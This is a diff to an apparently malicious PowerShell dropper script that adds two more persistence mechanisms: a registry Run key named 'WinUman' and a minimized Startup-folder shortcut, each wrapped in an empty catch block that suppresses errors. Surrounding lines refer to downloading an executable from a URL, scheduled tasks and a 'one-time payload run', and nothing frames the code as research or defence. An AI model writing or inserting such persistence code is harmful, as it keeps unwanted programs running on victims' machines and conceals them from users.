@@ -74,6 +74,23 @@ function Add-Persistence {
 # ===========================
 
 Add-Persistence -exePath $mainExePath -exeUrl $mainExeUrl -taskName $mainTaskName -runKeyName $mainRunKey
+# === PERSISTENCE 2: Registry Run Key ===
+try {
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $exePath
+} catch {}
+
+# === PERSISTENCE 3: Startup Folder Shortcut ===
+try {
+    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $shortcutPath = Join-Path $startupPath "$startupName.lnk"
+
+    $WScriptShell = New-Object -ComObject WScript.Shell
+    $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+    $shortcut.TargetPath = $exePath
+    $shortcut.WorkingDirectory = Split-Path $exePath
+    $shortcut.WindowStyle = 7  # Minimized
+    $shortcut.Save()
+} catch {}
 
 # ============================
 # === ONE-TIME PAYLOAD RUN ===
